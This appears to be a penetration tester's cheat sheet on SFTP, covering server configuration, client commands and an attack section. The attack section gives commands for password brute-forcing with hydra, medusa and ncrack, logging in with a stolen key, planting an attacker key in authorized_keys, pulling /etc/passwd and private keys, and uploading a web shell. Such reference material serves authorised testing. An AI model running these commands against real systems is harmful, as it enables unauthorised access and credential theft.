#SFTP #SSH #filetransfer #remoteaccess

## What is SFTP?
SSH File Transfer Protocol — secure file transfer subsystem running over SSH. Not FTP over SSL (FTPS). Encrypted by default. Commonly used for managed file transfers and restricted shell access (chroot jails).

- Port: **TCP 22** (shares with SSH)
- Subsystem defined in `/etc/ssh/sshd_config`
- ChrootDirectory used to jail users to a specific directory

---

## Configuration (sshd_config)

```
# Enable SFTP subsystem
Subsystem sftp /usr/lib/openssh/sftp-server

# Restrict specific users to SFTP only (chroot jail)
Match User sftpuser
    ForceCommand internal-sftp
    ChrootDirectory /var/sftp
    AllowTcpForwarding no
    X11Forwarding no
```

---

## Connect / Access

```bash
# Connect with password
sftp <user>@<target>
sftp -P 2222 <user>@<target>   # non-standard port

# Connect with key
sftp -i /path/to/key.pem <user>@<target>

# Run single command
sftp <user>@<target>:<remote_path>
echo "get file.txt" | sftp <user>@<target>

# Batch mode (non-interactive)
sftp -b batchfile.txt <user>@<target>
```

---

## Key Commands

```bash
# Inside sftp session:
# Navigation
pwd                    # remote working dir
lpwd                   # local working dir
ls                     # list remote dir
ls -la
lls                    # list local dir
cd <dir>               # change remote dir
lcd <dir>              # change local dir
mkdir <dir>
rmdir <dir>

# Transfer
get <remote_file>                         # download to local cwd
get <remote_file> <local_path>            # download with rename
put <local_file>                          # upload to remote cwd
put <local_file> <remote_path>            # upload with rename
mget *.txt                                # download multiple
mput *.php                                # upload multiple

# Recursive transfer
get -r <remote_dir>
put -r <local_dir>

# Delete / rename
rm <remote_file>
rename <old> <new>

# Exit
bye
exit
quit
```

---

## Attack Vectors

### Brute Force

```bash
hydra -L users.txt -P passwords.txt sftp://<target>
medusa -h <target> -U users.txt -P passwords.txt -M ssh
ncrack -p 22 --user root -P passwords.txt <target>
```

### Weak/Stolen Key Auth

```bash
# If private key found on target or leaked
sftp -i stolen_key.pem <user>@<target>
chmod 600 stolen_key.pem
sftp -i stolen_key.pem <user>@<target>
```

### Write SSH Authorized Key (if home dir writable)

```bash
# If sftp user has write access to ~/.ssh/
sftp <user>@<target>
sftp> put /tmp/attacker_pub.pub /home/<user>/.ssh/authorized_keys
# Then SSH in
ssh -i attacker_priv <user>@<target>
```

### Chroot Escape

```bash
# Chroot requires ChrootDirectory be owned by root and not writable by user
# Misconfigurations that allow escape:
# - writable ChrootDirectory
# - SetUID binaries inside chroot
# - Symlink attacks if follows are allowed

# Check what's inside the jail
sftp> ls -la /
sftp> ls -la /bin

# Look for SUID binaries in chroot
sftp> ls -la /bin/sh
```

### Read Config / Sensitive Files (if not jailed)

```bash
sftp <user>@<target>
sftp> get /etc/ssh/sshd_config
sftp> get /etc/passwd
sftp> get /home/<user>/.ssh/id_rsa
sftp> get /home/<user>/.bash_history
```

### Upload Web Shell (if web dir writable)

```bash
sftp <user>@<target>
sftp> cd /var/www/html
sftp> put shell.php
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| Weak password on SFTP account | Brute force |
| No ChrootDirectory on SFTP users | Full filesystem access |
| ChrootDirectory writable by user | Chroot escape |
| SSH key present in authorized_keys | Key theft = access |
| ForceCommand not set | Full SSH shell instead of SFTP only |
| Write access to web directories | Web shell upload |

---

## Quick Reference

| Goal | Command |
|---|---|
| Connect (password) | `sftp user@host` |
| Connect (key) | `sftp -i key.pem user@host` |
| Download file | `get remote_file` (inside sftp) |
| Upload file | `put local_file` (inside sftp) |
| Recursive download | `get -r remote_dir` |
| Brute force | `hydra -L users.txt -P pass.txt sftp://host` |
